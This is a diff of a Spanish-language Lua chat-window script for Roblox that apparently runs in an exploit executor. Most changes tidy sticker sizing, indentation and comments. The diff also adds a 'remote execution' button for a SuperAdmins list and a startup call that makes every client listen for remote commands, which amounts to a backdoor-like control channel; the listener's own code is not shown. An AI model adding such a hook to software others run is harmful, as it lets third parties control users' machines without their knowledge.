@@ -1162,7 +1331,96 @@ stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
                     Thickness = 3
                 }):Play()
                 TweenService:Create(stickerContainer, TweenInfo.new(0.2), {
-                    Size = UDim2.new(0, (isMobile and 120 or 160) * 1.05, 0, (isMobile and 120 or 160) * 1.05)
+                    Size = UDim2.new(0, stickerRealSize * 1.05, 0, stickerRealSize * 1.05)
+                }):Play()
+            end)
+
+            stickerContainer.MouseLeave:Connect(function()
+                TweenService:Create(stickerStroke, TweenInfo.new(0.2), {
+                    Transparency = 0.5,
+                    Thickness = 2
+                }):Play()
+                TweenService:Create(stickerContainer, TweenInfo.new(0.2), {
+                    Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
+                }):Play()
+            end)
+            
+            offsetY = offsetY + stickerRealSize + 10
+            
+            if hayTextoAdicional then
+                local messageText = Instance.new("TextLabel")
+                messageText.Name = "MessageText"
+                messageText.Size = UDim2.new(1, -50, 0, alturaTextoMensaje + 4)
+                messageText.Position = UDim2.new(0, 0, 0, offsetY)
+                messageText.BackgroundTransparency = 1
+                messageText.Text = textoSinURL
+                messageText.TextColor3 = Color3.fromRGB(230, 230, 230)
+                messageText.Font = Enum.Font.Gotham
+                messageText.TextSize = isMobile and 12 or 13
+                messageText.TextXAlignment = Enum.TextXAlignment.Left
+                messageText.TextYAlignment = Enum.TextYAlignment.Top
+                messageText.TextWrapped = true
+                messageText.ZIndex = 4
+                messageText.Parent = messageFrame
+            end
+            
+        elseif esSticker then
+            if hayTextoAdicional then
+                local messageText = Instance.new("TextLabel")
+                messageText.Name = "MessageText"
+                messageText.Size = UDim2.new(1, -50, 0, alturaTextoMensaje + 4)
+                messageText.Position = UDim2.new(0, 0, 0, offsetY)
+                messageText.BackgroundTransparency = 1
+                messageText.Text = textoSinURL
+                messageText.TextColor3 = Color3.fromRGB(230, 230, 230)
+                messageText.Font = Enum.Font.Gotham
+                messageText.TextSize = isMobile and 12 or 13
+                messageText.TextXAlignment = Enum.TextXAlignment.Left
+                messageText.TextYAlignment = Enum.TextYAlignment.Top
+                messageText.TextWrapped = true
+                messageText.ZIndex = 4
+                messageText.Parent = messageFrame
+                
+                offsetY = offsetY + alturaTextoMensaje + 8
+            end
+            
+            local stickerContainer = Instance.new("Frame")
+            stickerContainer.Name = "StickerContainer"
+            stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
+            stickerContainer.Position = UDim2.new(0, 0, 0, offsetY)
+            stickerContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+            stickerContainer.BorderSizePixel = 0
+            stickerContainer.ZIndex = 4
+            stickerContainer.Parent = messageFrame
+            
+            local stickerCorner = Instance.new("UICorner", stickerContainer)
+            stickerCorner.CornerRadius = UDim.new(0, 12)
+            
+            local stickerStroke = Instance.new("UIStroke", stickerContainer)
+            stickerStroke.Color = Color3.fromRGB(88, 101, 242)
+            stickerStroke.Thickness = 2
+            stickerStroke.Transparency = 0.5
+            
+            local stickerImage = Instance.new("ImageLabel")
+            stickerImage.Name = "StickerImage"
+            stickerImage.Size = UDim2.new(1, -10, 1, -10)
+            stickerImage.Position = UDim2.new(0, 5, 0, 5)
+            stickerImage.BackgroundTransparency = 1
+            stickerImage.Image = urlImagen
+            stickerImage.ScaleType = Enum.ScaleType.Fit
+            stickerImage.ZIndex = 5
+            stickerImage.Parent = stickerContainer
+            
+            local imgCorner = Instance.new("UICorner", stickerImage)
+            imgCorner.CornerRadius = UDim.new(0, 10)
+            
+            stickerContainer.MouseEnter:Connect(function()
+                TweenService:Create(stickerStroke, TweenInfo.new(0.2), {
+                    Transparency = 0.2,
+                    Thickness = 3
+                }):Play()
+                TweenService:Create(stickerContainer, TweenInfo.new(0.2), {
+                    Size = UDim2.new(0, stickerRealSize * 1.05, 0, stickerRealSize * 1.05)
                 }):Play()
             end)
             
@@ -1172,14 +1430,11 @@ stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
                     Thickness = 2
                 }):Play()
                 TweenService:Create(stickerContainer, TweenInfo.new(0.2), {
-                    Size = UDim2.new(0, isMobile and 120 or 160, 0, isMobile and 120 or 160)
+                    Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
                 }):Play()
             end)
             
-   
-            
         else
-            -- No hay imagen, solo texto normal
             local messageText = Instance.new("TextLabel")
             messageText.Name = "MessageText"
             messageText.Size = UDim2.new(1, -50, 0, alturaTextoMensaje + 4)
@@ -1196,7 +1451,6 @@ stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
             messageText.Parent = messageFrame
         end
 
-        -- Botones
         local btnSize = isMobile and 38 or 45
 
         local replyBtn = Instance.new("TextButton")
@@ -1298,7 +1552,6 @@ stickerContainer.Size = UDim2.new(0, stickerRealSize, 0, stickerRealSize)
             end
         end)
 
-        -- Animación de entrada
         container.BackgroundTransparency = 1
         container.Size = UDim2.new(1, -10, 0, 0)
         
@@ -1407,10 +1660,10 @@ function crearChatGUI()
     local posX = (config.PosicionX or 0.05) * viewport.X
     local posY = (config.PosicionY or 0.3) * viewport.Y
 
-isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+    isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 
-local frameWidth = isMobile and math.min(viewport.X * 0.90, 340) or 450
-local frameHeight = isMobile and math.min(viewport.Y * 0.60, 450) or 380
+    local frameWidth = isMobile and math.min(viewport.X * 0.90, 340) or 450
+    local frameHeight = isMobile and math.min(viewport.Y * 0.60, 450) or 380
 
     frame = Instance.new("Frame")
     frame.Name = "MainFrame"
@@ -1457,7 +1710,7 @@ local frameHeight = isMobile and math.min(viewport.Y * 0.60, 450) or 380
 
     frame.BackgroundTransparency = config.Transparency or 0
 
-local titleBarHeight = isMobile and 32 or 40
+    local titleBarHeight = isMobile and 32 or 40
 
     local titleBar = Instance.new("Frame")
     titleBar.Name = "TitleBar"
@@ -1504,10 +1757,9 @@ local titleBarHeight = isMobile and 32 or 40
         end
     end)
 
-local btnSize = isMobile and 26 or 32
-local btnSpacing = isMobile and 30 or 38
+    local btnSize = isMobile and 26 or 32
+    local btnSpacing = isMobile and 30 or 38
 
-    -- 📦 BOTÓN DE MINIMIZAR (CORREGIDO)
     local minimizeBtn = Instance.new("TextButton")
     minimizeBtn.Name = "MinimizeButton"
     minimizeBtn.Size = UDim2.new(0, btnSize, 0, btnSize)
@@ -1532,11 +1784,9 @@ local btnSpacing = isMobile and 30 or 38
 
     minimizeBtn.MouseButton1Click:Connect(function()
         if isMinimized then
-            -- 🔧 MAXIMIZAR - CORREGIDO
             isMinimized = false
             minimizeBtn.Text = "➖"
             
-            -- Mostrar elementos ANTES de la animación
             if chatBox then chatBox.Visible = true end
             if inputContainer then inputContainer.Visible = true end
             if bgImage then bgImage.Visible = true end
@@ -1545,7 +1795,6 @@ local btnSpacing = isMobile and 30 or 38
                 Size = UDim2.new(0, frameWidth, 0, frameHeight)
             }):Play()
         else
-            -- 🔧 MINIMIZAR - CORREGIDO
             isMinimized = true
             minimizeBtn.Text = "➕"
             
@@ -1553,7 +1802,6 @@ local btnSpacing = isMobile and 30 or 38
                 Size = UDim2.new(0, frameWidth, 0, 0)
             }):Play()
             
-            -- Ocultar elementos DESPUÉS de la animación
             task.wait(0.3)
             if chatBox then chatBox.Visible = false end
             if inputContainer then inputContainer.Visible = false end
@@ -1583,11 +1831,40 @@ local btnSpacing = isMobile and 30 or 38
         Color3.fromRGB(70, 70, 80)
     )
 
+    -- 🔥 BOTÓN DE EJECUCIÓN REMOTA (SOLO SUPER ADMINS)
+    if SuperAdmins[player.Name] then
+        local remoteExecBtn = Instance.new("TextButton")
+        remoteExecBtn.Name = "RemoteExecButton"
+        remoteExecBtn.Size = UDim2.new(0, btnSize, 0, btnSize)
+        remoteExecBtn.Position = UDim2.new(1, -(btnSize * 3 + 15), 0.5, -btnSize/2)
+        remoteExecBtn.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
+        remoteExecBtn.Text = "🔥"
+        remoteExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        remoteExecBtn.Font = Enum.Font.GothamBold
+        remoteExecBtn.TextSize = isMobile and 16 or 20
+        remoteExecBtn.BorderSizePixel = 0
+        remoteExecBtn.ZIndex = 12
+        remoteExecBtn.Parent = titleBar
+
+        local remoteExecCorner = Instance.new("UICorner", remoteExecBtn)
+        remoteExecCorner.CornerRadius = UDim.new(0, 6)
+
+        AgregarEfectoHover(
+            remoteExecBtn, 
+            Color3.fromRGB(220, 53, 69), 
+            Color3.fromRGB(255, 70, 85)
+        )
+
+        remoteExecBtn.MouseButton1Click:Connect(function()
+            CrearPanelEjecucionRemota()
+        end)
+    end
+
     if ChatScripters[player.Name] then
         local deleteBtn = Instance.new("TextButton")
         deleteBtn.Name = "DeleteButton"
         deleteBtn.Size = UDim2.new(0, btnSize, 0, btnSize)
-        deleteBtn.Position = UDim2.new(1, -(btnSize * 3 + 15), 0.5, -btnSize/2)
+        deleteBtn.Position = UDim2.new(1, -(btnSize * (SuperAdmins[player.Name] and 4 or 3) + (SuperAdmins[player.Name] and 20 or 15)), 0.5, -btnSize/2)
         deleteBtn.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
         deleteBtn.Text = "🗑️"
         deleteBtn.TextColor3 = Color3.new(1, 1, 1)
@@ -1645,7 +1922,7 @@ local btnSpacing = isMobile and 30 or 38
         end)
     end
 
-local discordStartPos = isMobile and 115 or 220
+    local discordStartPos = isMobile and 115 or 220
     
     local discordBtn = Instance.new("ImageButton")
     discordBtn.Name = "DiscordButton1"
@@ -1855,7 +2132,6 @@ local discordStartPos = isMobile and 115 or 220
         }):Play()
     end)
 
-    -- 🎨 BOTÓN DE STICKERS
     local stickerBtnSize = isMobile and 30 or 35
     
     stickerButton = Instance.new("TextButton")
@@ -1916,7 +2192,6 @@ local discordStartPos = isMobile and 115 or 220
         Color3.fromRGB(108, 121, 255)
     )
 
-    -- FUNCIÓN PARA ENVIAR MENSAJE
     local function EnviarMensaje()
         if enviandoMensaje then
             sendButton.Text = "⏳ ESPERA"
@@ -2157,7 +2432,6 @@ local discordStartPos = isMobile and 115 or 220
         end
     end)
 
-    -- CARGAR MENSAJES INICIALES
     task.spawn(function()
         local success, response = pcall(function()
             return request({
@@ -2252,6 +2526,9 @@ task.spawn(function()
         task.wait(2.5)
     end
 end)
+
+-- Iniciar escucha de comandos remotos
+EscucharComandosRemotos()
 
 -- SISTEMA DE TOGGLES
 task.spawn(function()
